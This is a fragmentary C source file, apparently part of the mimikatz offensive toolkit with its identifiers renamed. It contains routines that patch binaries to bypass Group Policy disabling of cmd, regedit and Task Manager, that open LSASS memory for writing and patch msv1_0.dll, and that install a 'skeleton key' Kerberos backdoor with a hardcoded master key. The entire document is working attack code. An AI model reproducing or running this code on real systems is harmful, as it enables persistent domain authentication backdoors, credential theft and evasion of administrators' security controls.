...
{
	kuhl_m_misc_generic_nogpo_patch(L"cmd.exe", L"DisableCMD", sizeof(L"DisableCMD"), L"MangoAndCMD", sizeof(L"MangoAndCMD"));
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_misc_regedit(int argc, wchar_t * argv[])
{
	kuhl_m_misc_generic_nogpo_patch(L"regedit.exe", L"DisableRegistryTools", sizeof(L"DisableRegistryTools"), L"MangoAndRegistryTools", sizeof(L"MangoAndRegistryTools"));
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_misc_taskmgr(int argc, wchar_t * argv[])
{
	kuhl_m_misc_generic_nogpo_patch(L"taskmgr.exe", L"DisableTaskMgr", sizeof(L"DisableTaskMgr"), L"MangoAndTaskMgr", sizeof(L"MangoAndTaskMgr"));
	return STATUS_SUCCESS;
}
...
//	if(argc > 1)
//	{
//		if((zwan_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7) && (zwan_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8))
//		{
//			pOs = w2k8r2;
//			pOsSz = ARRAYSIZE(w2k8r2);
//		}
//		else if((zwan_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_8) && (zwan_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE))
//		{
//			pOs = w2k12;
//			pOsSz = ARRAYSIZE(w2k12);
//		}
//		else if((zwan_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_BLUE) && (zwan_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_10))
//		{
//			pOs = w2k12r2;
//			pOsSz = ARRAYSIZE(w2k12r2);
//		}
//		else if(zwan_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10)
//		{
//			pOs = wservprev;
		...
		if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, processId))
		{
			if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &aLsass.hMemory))
			{
				if(kull_m_process_getVeryBasicModuleInformationsForName(aLsass.hMemory, L"msv1_0.dll", &iMSV))
				{
					...
					if(pGeneric = kull_m_patch_getGenericFromBuild(MSV1_0AcceptReferences, ARRAYSIZE(MSV1_0AcceptReferences), zwan_NT_BUILD_NUMBER))
					{
...
NTSTATUS WINAPI kuhl_misc_skeleton_rc4_init(LPCVOID Key, DWORD KeySize, DWORD KeyUsage, PVOID * pContext)
{
	...
	PVOID origContext, mangoContext;
	DWORD mangoKey[] = {0Xca4fba60, 0x7a6c46dc, 0x81173c03, 0xf63dc094};
	if(*pContext = ((PLOCALALLOC) 0x4a4a4a4a4a4a4a4a)(0, 32 + sizeof(PVOID)))
	{
		...
		if(NT_SUCCESS(status))
		{
			...
			status = ((PKERB_ECRYPT_INITIALIZE) 0x4343434343434343)(mangoKey, 16, KeyUsage, &mangoContext);
			if(NT_SUCCESS(status))
			{
				((PMEMCPY) 0x4c4c4c4c4c4c4c4c)((PBYTE) *pContext + 16, mangoContext, 16);
				((PLOCALFREE) 0x4b4b4b4b4b4b4b4b)(mangoContext);
			}
...
{
	NTSTATUS status = STATUS_INSUFFICIENT_RESOURCES;
	DWORD origOutputSize = *OutputSize, mangoKey[] = {0Xca4fba60, 0x7a6c46dc, 0x81173c03, 0xf63dc094};
	PVOID buffer;
	if(buffer = ((PLOCALALLOC) 0x4a4a4a4a4a4a4a4a)(0, DataSize))
	{
		...
		if(!NT_SUCCESS(status))
		{
			*OutputSize = origOutputSize;
			...
			if(NT_SUCCESS(status))
				((PMEMCPY) 0x4c4c4c4c4c4c4c4c)(*(PVOID *) ((PBYTE) pContext + 32), mangoKey, 16);
		}
...
NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
{
	...
	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
	BOOL onlyRC4Stuff = (zwan_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_VISTA) || kull_m_string_args_byName(argc, argv, L"letaes", NULL, NULL);
...
#define zwan_COMPRESSED_FILENAME	zwan L"_" zwan_ARCH L".compressed"
...
#pragma warning(pop)
	...
	if(kull_m_file_readData(fileName, &data, &size))
	{
		...
		{
			kprintf(L" * Compressed size: %u (%.2f%%)\nUsing \'%s\' as output file... ", compressedSize, 100 * ((float) compressedSize / (float) size), zwan_COMPRESSED_FILENAME);
			if(kull_m_file_writeData(zwan_COMPRESSED_FILENAME, compressedData, compressedSize))
				kprintf(L"OK!\n");
